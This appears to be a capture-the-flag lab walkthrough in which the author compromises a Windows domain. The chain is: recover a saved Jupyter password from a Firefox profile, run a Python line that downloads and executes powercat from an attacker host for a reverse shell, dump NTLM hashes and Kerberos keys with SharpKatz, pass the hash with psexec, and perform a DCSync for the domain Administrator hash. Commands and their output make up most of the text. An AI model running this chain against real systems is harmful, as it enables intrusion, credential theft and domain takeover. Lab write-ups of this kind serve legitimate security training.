## NMAP
```
nmap -sCV -A -T4 172.16.1.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 11:48 PDT
Nmap scan report for 172.16.1.11
Host is up (0.078s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  http          Tornado httpd 6.1
|_http-server-header: TornadoServer/6.1
| http-robots.txt: 1 disallowed entry 
|_/ 
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: -56s
| smb2-time: 
|   date: 2023-04-14T18:47:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.64 seconds
```
![image](https://user-images.githubusercontent.com/128841823/232131782-4ed7f082-7069-4473-a36b-b93edde35e4d.png)

I can't find anything for this and metasploit did not work for it

I still don't have a password, so lets start looking at stuff on the last box. Paulo had a .mozilla folder in their profile
```
root@DEV02-Aphrodite:/home/paulo# ls -la
total 84
drwxr-xr-x 17 paulo paulo 4096 Jul 22  2022 .
drwxr-xr-x  3 root  root  4096 Jul 22  2022 ..
lrwxrwxrwx  1 root  root     9 Dec 29  2020 .bash_history -> /dev/null
-rw-r--r--  1 paulo paulo  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 paulo paulo 3797 Oct  6  2020 .bashrc
drwx------ 14 paulo paulo 4096 Jul 22  2022 .cache
drwx------ 11 paulo paulo 4096 Jul 22  2022 .config
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Desktop
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Documents
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Downloads
-r--------  1 paulo paulo   26 Dec 29  2020 flag.txt
drwx------  3 paulo paulo 4096 Jul 22  2022 .gnupg
drwxrwxr-x  3 paulo paulo 4096 Jul 22  2022 .local
drwx------  5 paulo paulo 4096 Jul 22  2022 .mozilla
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Music
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Pictures
-rw-r--r--  1 paulo paulo  807 Feb 25  2020 .profile
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Public
drwx------  3 paulo paulo 4096 Jul 22  2022 snap
drwx------  2 paulo paulo 4096 Jul 22  2022 .ssh
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Templates
drwxr-xr-x  2 paulo paulo 4096 Jul 22  2022 Videos
root@DEV02-Aphrodite:/home/paulo# cd .mozilla
```

Lets transfer the files to my desktop to look at them

A tool called firepwd allows me to look at saved passwords in the directory
```
python3 firepwd.py -d /home/p3ta/HTB/genesis/firefox/92f2rlly.default-release
```
```
clearText b'522a37319d07e3ec70b37fc2614a16f4c40883836e6286040808080808080808'
decrypting login/password pairs
http://172.16.1.11:8888:b'',b'sRVJAz837u'

```

Now we can login to jupyter notebook

Jupyer is vulnerable to code execution
![image](https://user-images.githubusercontent.com/128841823/232145644-9679e0ee-801a-4a0b-a0a3-375bd13667f0.png)

We can use powercat for this 

start a listener on 4444 and http server that can host the powercat.ps1
```
import os
print(os.popen("powershell iex(iwr http://10.0.1.2/powercat.ps1 -useb)").read())
```
```
nc -lvp 4444
listening on [any] 4444 ...
10.10.110.254: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.254] 28103
Microsoft Windows [Version 10.0.19044.1826]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Documents\Notebooks>whoami
whoami
ws03-atlas\administrator
```
I find an internal audit folder
```
 Directory of C:\Users\Administrator\Desktop

06/06/2021  09:38 PM    <DIR>          .
06/06/2021  09:38 PM    <DIR>          ..
04/04/2021  09:25 PM                30 flag.txt
06/06/2021  10:02 PM    <DIR>          Internal Audit
```
```
C:\Users\Administrator\Desktop\Internal Audit>type todo.txt
type todo.txt
- Generate Bloodhound dump and perform audit.
- Create report and respond with the results
```
SharpKatz
```
C:\Users\Administrator\Desktop>powershell wget 10.0.1.2:8081/SharpKatz.exe -o sk.exe
```
```
C:\Users\Administrator\Desktop>sk.exe
sk.exe
[*]
[*] 			System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 19044         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[*] Authentication Id	: 0;261389 (00000000:00261389)
[*] Session		: Interactive from 1
[*] UserName		: Administrator
[*] LogonDomain		: WS03-ATLAS
[*] LogonServer		: WS03-ATLAS
[*] LogonTime		: 2023/03/10 02:43:16
[*] SID			: S-1-5-21-2108685607-1432945783-763717370-500
[*]
[*]	 Msv
[*]	  Domain   : WS03-ATLAS
[*]	  Username : Administrator
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : 8ab4098640a136722461728dc38faee2
[*]	  SHA1     : a23b7ed7f4b525cbf9f6fce7cc8dcc8f0d23be61
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*]	 WDigest
[*]	  Hostname : WS03-ATLAS 
[*]	  Username : Administrator 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : WS03-ATLAS 
[*]	  Username : Administrator 
[*]	  Password : [NULL]
[*]
[*] Authentication Id	: 0;74671 (00000000:00074671)
[*] Session		: Interactive from 1
[*] UserName		: DWM-1
[*] LogonDomain		: Window Manager
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:01
[*] SID			: S-1-5-90-0-1
[*]
[*]	 Msv
[*]	  Domain   : ADMIN
[*]	  Username : WS03-ATLAS$
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : bb52266a1adcebb5536ef88542e835e5
[*]	  SHA1     : 983e99446361fd786e3bf62832029a05084ca19d
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*]	 WDigest
[*]	  Hostname : ADMIN 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : genesis-admin.local 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : 03 9b bb 6e c0 50 b6 2f ff f5 d5 8d 01 39 ee 60 4c c8 59 f3 1e fc 2a 74 48 44 ae ad 9f ae d4 f2 d6 e9 be 3e f4 b8 17 97 16 e8 39 c6 c8 84 d0 db 44 3a 9d 5e be d9 35 be 71 5b 4c be a0 84 7b 03 2e d7 62 bd 7d 77 fb 81 9c d6 09 7d 7d 22 d2 c7 94 34 cf a1 ea f6 37 cf be 5e 95 be c0 bc 69 26 23 1f ea 68 46 6b 78 c3 af f3 3a 7c df 14 67 f4 6c 8f ac 3f f8 92 f6 0d 1a 00 f0 55 0a ee 32 c1 0c 50 25 32 24 6b fe 07 57 77 21 c4 23 95 a2 20 59 62 62 3e c9 8b ac ea 9d 1c c5 3b cd 89 95 3d 33 f2 45 32 c5 77 5d 3b c8 50 2a f9 13 05 15 7b ea 83 8b 30 bc 74 b8 29 45 7b 67 eb 30 71 8f 1d a3 5f 69 f0 4e b0 72 e5 f2 08 f3 66 c4 b3 31 b1 ca be 67 67 91 4e b3 c7 c9 8a 4c 15 76 5f 2c e7 7d 73 ae e4 66 17 57 52 c2 ae d5 28 c9 40 f9 06 
[*]
[*] Authentication Id	: 0;74646 (00000000:00074646)
[*] Session		: Interactive from 1
[*] UserName		: DWM-1
[*] LogonDomain		: Window Manager
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:01
[*] SID			: S-1-5-90-0-1
[*]
[*]	 Msv
[*]	  Domain   : ADMIN
[*]	  Username : WS03-ATLAS$
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : a9d8fc54a2b2362357b95ddb02e642c6
[*]	  SHA1     : c4f6e08341b476da721ec4284b842ba823362bf3
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*]	 WDigest
[*]	  Hostname : ADMIN 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : genesis-admin.local 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : e1 ac be ce 70 5e 54 b2 66 0b ed 4a 16 ba a0 90 97 27 d2 8b 15 d1 46 c4 7b 7a a3 8b 2b d9 66 c6 8b 5d e9 a2 e7 38 a4 54 f1 18 7d 28 9e c3 e8 11 f6 9e 5d d1 fd 37 21 90 fd be c5 49 fe 29 96 d0 d5 59 df 35 b9 5e ca af fa f5 e5 d9 4b b1 dc 8f 45 f2 03 1a e9 a3 fe 4d df 65 ed bd 7a cb ed e3 62 2b 20 39 0e 34 54 7f 17 9b b6 65 c9 e6 95 5f f6 4b a4 d7 e6 37 9c 84 eb 43 31 3e 77 13 e3 7b dc 0f 4b 5a 38 f2 5e 14 39 da 04 25 06 6e 7e aa 19 ad 8d 11 28 8e 29 0d 0a 7b d2 ab 1d 13 cb c6 e3 94 8b 22 4d 83 84 e7 4a 94 e0 ef 1b 24 30 ee 97 25 20 38 cf a1 81 2b 15 57 a5 4e b4 12 f7 2b 65 02 2c dd 3a 3a 51 23 2b 87 32 b0 57 5e 9e 84 9f ee 7e 43 a0 3c 4b 9a d0 26 cc 47 13 b8 6b 3d 37 28 75 d8 d4 80 ed 6f fb 63 e1 f4 50 bd 0d 5e 
[*]
[*] Authentication Id	: 0;996 (00000000:00000996)
[*] Session		: Service from 0
[*] UserName		: WS03-ATLAS$
[*] LogonDomain		: ADMIN
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:01
[*] SID			: S-1-5-20
[*]
[*]	 Msv
[*]	  Domain   : ADMIN
[*]	  Username : WS03-ATLAS$
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : a9d8fc54a2b2362357b95ddb02e642c6
[*]	  SHA1     : c4f6e08341b476da721ec4284b842ba823362bf3
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*]	 WDigest
[*]	  Hostname : ADMIN 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : GENESIS-ADMIN.LOCAL 
[*]	  Username : ws03-atlas$ 
[*]	  Password : [NULL]
[*]
[*] Authentication Id	: 0;43267 (00000000:00043267)
[*] Session		: Interactive from 0
[*] UserName		: UMFD-0
[*] LogonDomain		: Font Driver Host
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:01
[*] SID			: S-1-5-96-0-0
[*]
[*]	 Msv
[*]	  Domain   : ADMIN
[*]	  Username : WS03-ATLAS$
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : a9d8fc54a2b2362357b95ddb02e642c6
[*]	  SHA1     : c4f6e08341b476da721ec4284b842ba823362bf3
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*]	 WDigest
[*]	  Hostname : ADMIN 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : genesis-admin.local 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : e1 ac be ce 70 5e 54 b2 66 0b ed 4a 16 ba a0 90 97 27 d2 8b 15 d1 46 c4 7b 7a a3 8b 2b d9 66 c6 8b 5d e9 a2 e7 38 a4 54 f1 18 7d 28 9e c3 e8 11 f6 9e 5d d1 fd 37 21 90 fd be c5 49 fe 29 96 d0 d5 59 df 35 b9 5e ca af fa f5 e5 d9 4b b1 dc 8f 45 f2 03 1a e9 a3 fe 4d df 65 ed bd 7a cb ed e3 62 2b 20 39 0e 34 54 7f 17 9b b6 65 c9 e6 95 5f f6 4b a4 d7 e6 37 9c 84 eb 43 31 3e 77 13 e3 7b dc 0f 4b 5a 38 f2 5e 14 39 da 04 25 06 6e 7e aa 19 ad 8d 11 28 8e 29 0d 0a 7b d2 ab 1d 13 cb c6 e3 94 8b 22 4d 83 84 e7 4a 94 e0 ef 1b 24 30 ee 97 25 20 38 cf a1 81 2b 15 57 a5 4e b4 12 f7 2b 65 02 2c dd 3a 3a 51 23 2b 87 32 b0 57 5e 9e 84 9f ee 7e 43 a0 3c 4b 9a d0 26 cc 47 13 b8 6b 3d 37 28 75 d8 d4 80 ed 6f fb 63 e1 f4 50 bd 0d 5e 
[*]
[*] Authentication Id	: 0;43268 (00000000:00043268)
[*] Session		: Interactive from 1
[*] UserName		: UMFD-1
[*] LogonDomain		: Font Driver Host
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:01
[*] SID			: S-1-5-96-0-1
[*]
[*]	 Msv
[*]	  Domain   : ADMIN
[*]	  Username : WS03-ATLAS$
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : a9d8fc54a2b2362357b95ddb02e642c6
[*]	  SHA1     : c4f6e08341b476da721ec4284b842ba823362bf3
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*]	 WDigest
[*]	  Hostname : ADMIN 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : genesis-admin.local 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : e1 ac be ce 70 5e 54 b2 66 0b ed 4a 16 ba a0 90 97 27 d2 8b 15 d1 46 c4 7b 7a a3 8b 2b d9 66 c6 8b 5d e9 a2 e7 38 a4 54 f1 18 7d 28 9e c3 e8 11 f6 9e 5d d1 fd 37 21 90 fd be c5 49 fe 29 96 d0 d5 59 df 35 b9 5e ca af fa f5 e5 d9 4b b1 dc 8f 45 f2 03 1a e9 a3 fe 4d df 65 ed bd 7a cb ed e3 62 2b 20 39 0e 34 54 7f 17 9b b6 65 c9 e6 95 5f f6 4b a4 d7 e6 37 9c 84 eb 43 31 3e 77 13 e3 7b dc 0f 4b 5a 38 f2 5e 14 39 da 04 25 06 6e 7e aa 19 ad 8d 11 28 8e 29 0d 0a 7b d2 ab 1d 13 cb c6 e3 94 8b 22 4d 83 84 e7 4a 94 e0 ef 1b 24 30 ee 97 25 20 38 cf a1 81 2b 15 57 a5 4e b4 12 f7 2b 65 02 2c dd 3a 3a 51 23 2b 87 32 b0 57 5e 9e 84 9f ee 7e 43 a0 3c 4b 9a d0 26 cc 47 13 b8 6b 3d 37 28 75 d8 d4 80 ed 6f fb 63 e1 f4 50 bd 0d 5e 
[*]
[*] Authentication Id	: 0;42180 (00000000:00042180)
[*] Session		: UndefinedLogonType from 0
[*] UserName		: 
[*] LogonDomain		: 
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:00
[*] SID			: 
[*]
[*]	 Msv
[*]	  Domain   : ADMIN
[*]	  Username : WS03-ATLAS$
[*]	  LM       : 00000000000000000000000000000000
[*]	  NTLM     : a9d8fc54a2b2362357b95ddb02e642c6
[*]	  SHA1     : c4f6e08341b476da721ec4284b842ba823362bf3
[*]	  DPAPI    : 00000000000000000000000000000000
[*]
[*] Authentication Id	: 0;999 (00000000:00000999)
[*] Session		: UndefinedLogonType from 0
[*] UserName		: WS03-ATLAS$
[*] LogonDomain		: ADMIN
[*] LogonServer		: 
[*] LogonTime		: 2023/03/10 02:43:00
[*] SID			: S-1-5-18
[*]
[*]	 WDigest
[*]	  Hostname : ADMIN 
[*]	  Username : WS03-ATLAS$ 
[*]	  Password : [NULL]
[*]
[*]	 Kerberos
[*]	  Domain   : GENESIS-ADMIN.LOCAL 
[*]	  Username : ws03-atlas$ 
[*]	  Password : [NULL]
[*]

C:\Users\Administrator\Desktop>

```
Now lets login with PSEXEC
```
impacket-psexec administrator@172.16.1.11 -hashes :8ab4098640a136722461728dc38faee2
```
Transfer and run sharphound
```
 Directory of C:\Users\Administrator\Desktop\Internal Audit

04/14/2023  01:42 PM    <DIR>          .
04/14/2023  01:42 PM    <DIR>          ..
06/06/2021  10:02 PM    <DIR>          BloodHound-win32-x64
04/14/2023  01:42 PM           723,456 sh.exe
06/06/2021  09:39 PM                92 todo.txt
               2 File(s)        723,548 bytes
               3 Dir(s)   8,942,247,936 bytes free

C:\Users\Administrator\Desktop\Internal Audit> sh.exe
2023-04-14T13:42:18.3095400-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-04-14T13:42:18.5114922-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-04-14T13:42:18.5364833-07:00|INFORMATION|Initializing SharpHound at 1:42 PM on 4/14/2023
2023-04-14T13:42:19.3009180-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-04-14T13:42:19.5587384-07:00|INFORMATION|Beginning LDAP search for genesis-admin.local
2023-04-14T13:42:19.6048784-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-04-14T13:42:19.6384326-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-04-14T13:42:50.0953044-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 29 MB RAM
2023-04-14T13:43:04.9124885-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-04-14T13:43:04.9692061-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-04-14T13:43:05.1532590-07:00|INFORMATION|Status: 95 objects finished (+95 2.111111)/s -- Using 32 MB RAM
2023-04-14T13:43:05.1552571-07:00|INFORMATION|Enumeration finished in 00:00:45.6042438
2023-04-14T13:43:05.3002882-07:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-04-14T13:43:05.3332569-07:00|INFORMATION|SharpHound Enumeration Completed at 1:43 PM on 4/14/2023! Happy Graphing!
```
We can copy the .zip to our notebook
```
C:\Users\Administrator\Desktop\Internal Audit> copy 20230414134304_BloodHound.zip C:\Users\Administrator\Documents\notebooks
        1 file(s) copied.

C:\Users\Administrator\Desktop\Internal Audit>
```
That did not work so I am trying another method
```
powershell
iex(iwr http://10.0.1.2:8081/SharpHound.ps1 -useb)
Invoke-Bloodhound -CollectionMethod All
```

![image](https://user-images.githubusercontent.com/128841823/232154329-e58ff2b8-57d6-4f41-afe1-43a9034f875d.png)

This should be vulnerable to a dcsync
```
C:\Users\Administrator\Desktop> sk.exe --Command dcsync --Domain genesis-admin.local --User Administrator
```
```
*]
[*] 			System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 19044         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] genesis-admin.local will be the domain
[!] DC02-Tartarus.genesis-admin.local will be the DC server
[!] Administrator will be the user account
[*]
[*] Object RDN           : Administrator
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : Administrator
[*] User Principal Name  : 
[*] Account Type         : USER_OBJECT
[*] User Account Control : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
[*] Account expiration   : 12/31/1600 4:00:00 PM
[*] Password last change : 5/26/2021 11:08:02 PM
[*] Object Security ID   : S-1-5-21-3306154538-4261302417-171900893-500
[*] Object Relative ID   : 500
[*]
[*] Credentials:
[*] Hash NTLM            : f60bec8b2cea3286e4649598dbcfe030
[*] ntlm- 0              : f60bec8b2cea3286e4649598dbcfe030
[*] lm  - 0              : c157fa78aace798123f138560f77dab2
[*]
[*] Supplemental Credentials: 
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*] 	Random Value : b99860784f546e73b0410e77f7533092
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*] 	Default Salt :GENESIS-ADMIN.LOCALAdministrator
[*] 	Credentials
[*] 	aes256_hmac       4096: 74b9af2523d3cac27e2bf8c8e5b0d3865ff24526b306544fdaabb5e8e3124eac
[*] 	aes128_hmac       4096: 53d7a2d345357e70a7a75f6c8c35ee1e
[*] 	des_cbc_md5       4096: 64299176755770b0
[*] 	ServiceCredentials
[*] 	OldCredentials
[*] 	aes256_hmac       4096: 3bbf0c07fc3a9d87fa22faad623a90ff76c321dbf4ff2bf1af46ea2f0bd05e9b
[*] 	aes128_hmac       4096: 37839a81d2990fa5c18a59b478dcbe6c
[*] 	des_cbc_md5       4096: e3e02acb3ee08c5e
[*] 	OlderCredentials
[*] 	aes256_hmac       4096: 3bbf0c07fc3a9d87fa22faad623a90ff76c321dbf4ff2bf1af46ea2f0bd05e9b
[*] 	aes128_hmac       4096: 37839a81d2990fa5c18a59b478dcbe6c
[*] 	des_cbc_md5       4096: e3e02acb3ee08c5e
[*]
[*]  * Primary:Kerberos
[*] 	Default Salt :GENESIS-ADMIN.LOCALAdministrator
[*] 	Credentials
[*] 	des_cbc_md5       : 64299176755770b0
[*] 	OldCredentials
[*] 	des_cbc_md5       : e3e02acb3ee08c5e
[*]
[*]  * Packages
[*] 	NTLM-Strong-NTOWFKerberos-Newer-KeysKerberosWDigest
[*]
[*]  * Primary:WDigest
[*] 	01 b06fad54b72e0eae07ff20e3e88fdd39
[*] 	02 8f0c322fa2de51091dbc100f28191d07
[*] 	03 59af6d2d85e5e9a99dba6480dcfaf3c0
[*] 	04 b06fad54b72e0eae07ff20e3e88fdd39
[*] 	05 573bdab1f2a35278b86c3c4242e4016a
[*] 	06 68e352658e1be56c5eafd0e53ab1225b
[*] 	07 1473406cd3622f2fbd1d6fec8598c6b3
[*] 	08 33224c8ddf09d6eed177909c82a0633f
[*] 	09 bb84fe24d09550dd150a1cc6f21cda00
[*] 	10 6dbec7a56ecf6b82bb8f47db90d689a7
[*] 	11 618bf2c13a3fef12b031777e36b03630
[*] 	12 33224c8ddf09d6eed177909c82a0633f
[*] 	13 91cadab23e22026682c29b3b1e72af25
[*] 	14 7ce2ff6636b60f03a6bbfb7b1ef5ee40
[*] 	15 ac28bf964a3d8cfd01be3cbdf37dc5ac
[*] 	16 da17593cb70654723978512d2ea9e2fc
[*] 	17 c9a33aec5980eaedc6fd4a570db13c1e
[*] 	18 c113b4c93ab96a2005a6a5d7e5105178
[*] 	19 e81c3807a1487d739d3d8c1414de32de
[*] 	20 a5da9a7cd7482d386078720375959cce
[*] 	21 b315b6a2ffdd96db9b0057af2ef97218
[*] 	22 f71e480f2d41f039a07bb867b5c7be26
[*] 	23 83b6db4a146f75c6f6d41dd63d2ac8a7
[*] 	24 ac813564c9c9fb72791cd76aa9c624aa
[*] 	25 c442d0429dff581f90fa611f6b7e7efc
[*] 	26 dee3c9d37a2729458906c36073039697
[*] 	27 327089f6c74214a2eba6d3a47028aacf
[*] 	28 4a037bd080a99661e4e916cb92b4390f
[*] 	29 8bbc1d0746016a81f4d3392736e7201b
[*]
```
## NTLM Hash
```
f60bec8b2cea3286e4649598dbcfe030
```
